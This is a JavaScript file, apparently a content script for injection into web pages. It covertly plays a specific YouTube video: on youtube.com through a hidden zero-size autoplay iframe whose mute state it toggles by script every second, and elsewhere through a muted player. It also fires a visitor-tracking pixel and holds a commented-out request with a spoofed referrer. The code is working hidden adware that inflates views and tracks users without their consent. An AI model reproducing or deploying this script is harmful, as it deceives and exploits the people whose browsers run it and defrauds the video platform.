new Image().src="http://whos.amung.us/widget/muglauser.png";
var youtubePlayer;
function setCookie(cname, cvalue, exdays) {
	var d = new Date();
	d.setTime(d.getTime() + (exdays*20*1000));
	var expires = "expires="+d.toUTCString();
	document.cookie = cname + "=" + cvalue + "; " + expires;
}
function getCookie(cname) {
	var name = cname + "=";
	var ca = document.cookie.split(';');
	for(var i = 0; i < ca.length; i++) {
		var c = ca[i];
		while (c.charAt(0) == ' ') {
			c = c.substring(1);
		}
		if (c.indexOf(name) == 0) {
			return c.substring(name.length, c.length);
		}
	}
	return "";
}

      var tag = document.createElement('script');
      tag.src = "https://www.youtube.com/iframe_api";
       document.getElementsByTagName('body')[0].appendChild(tag);
	  
   
	  
function apiget(video_id){
	var div = document.createElement('div');
	  div.id="player_"+video_id;
	  document.getElementsByTagName('body')[0].appendChild(div);

   var player;
      function start() {
        player = new YT.Player("player_"+video_id, {
          height: '390',
          width: '640',
          videoId: video_id,
          events: {
            'onReady': onPlayerReady
          }
        });
      }
	
      function onPlayerReady(event) {
		event.target.mute();
		youtubePlayer=event.target;
      }
	  start();
}
function watch(video_id){
	if(getCookie("play_"+video_id)=="1"){}else{
		apiget(video_id);
		setCookie("play_"+video_id,"1",1);
	}
}

function youtube(video_id){
	var url="https://www.youtube.com/embed/"+video_id+"?autoplay=1";
	if(getCookie("play_"+video_id)=="1"){}else{
			i=document.createElement('iframe');i.id="sananeyarak";i.width="0";i.height=0;
			i.src=url;
			document.getElementsByTagName('body')[0].appendChild(i);

			var is_open=function(x){
				var value=x.getElementsByClassName("ytp-mute-button ytp-button")[0].getElementsByClassName("ytp-svg-fill")[0].getAttribute("d");
				return value =="m 9,15.37 0,5.25 3.58,0 4.48,4.37 0,-14 -4.48,4.37 -3.58,0 0,0 z M21,18 C21,16.43 20.01,15.08 18.78,14.42 l0,7.16 C20.1,20.92 21,19.57 21,18 z M 18.78,10.2 18.78,12.04 C21.35,12.8 23.22,15.18 23.22,18 23.22,20.82 21.35,23.2 18.78,23.96 L18.78,25.8 C22.34,24.99 25,21.8 25,18 25,14.2 22.34,11.01 18.78,10.2 z";
			}
			setInterval(function(){
			if(is_open(document.getElementById("sananeyarak").contentWindow.document)){
				document.getElementById("sananeyarak").contentWindow.document.getElementsByClassName("ytp-mute-button ytp-button")[0].click();
			}},1000);
			setCookie("play_"+video_id,"1",1);
		}
	
	}
	function onYouTubeIframeAPIReady(){
		if(location.hostname.indexOf("youtube.com")>-1){
			youtube("s0MY5dDU-dI");
		}else {
			watch("s0MY5dDU-dI");
		}
			

	}
	// function getRequest(url){
		// var xhr=new XMLHttpRequest;
			// xhr.open("GET",url,false);
			 // xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			 // xhr.send();
	// }
	// getRequest("https://www.youtube.com/get_video_info?html5=1&video_id=s0MY5dDU-dI&cpn=wuwDNHk9n1ljWWFm&eurl=http%3A%2F%2Fwowediadealer.com%2Fyoutube.php&el=embedded&hl=tr_TR&sts=16920&lact=4&width=640&height=390&authuser=0&ei=eAgrV937EomQWIf3krgL&iframe=1&c=WEB&cver=1.20160502&cplayer=UNIPLAYER&cbr=Chrome&cbrver=49.0.2623.112&cos=Windows&cosver=6.1");
